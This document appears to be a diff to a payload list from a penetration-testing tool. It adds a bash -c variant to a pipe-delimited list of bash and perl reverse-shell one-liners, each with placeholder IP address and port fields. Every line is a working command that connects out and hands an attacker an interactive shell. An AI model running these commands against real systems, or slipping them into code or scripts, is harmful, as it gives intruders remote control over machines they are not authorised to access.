@@ -1,4 +1,5 @@
 BASH REVERSE SHELL|bash -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1
+BASH REVERSE SHELL|bash -c 'bash -i >& /dev/tcp/[IPADDR]/[PORT] 0>&1'
 BASH REVERSE SHELL|0<&196;exec 196<>/dev/tcp/[IPADDR]/[PORT]; sh <&196 >&196 2>&196
 PERL REVERSE SHELL|perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 PERL REVERSE SHELL WINDOWS|perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
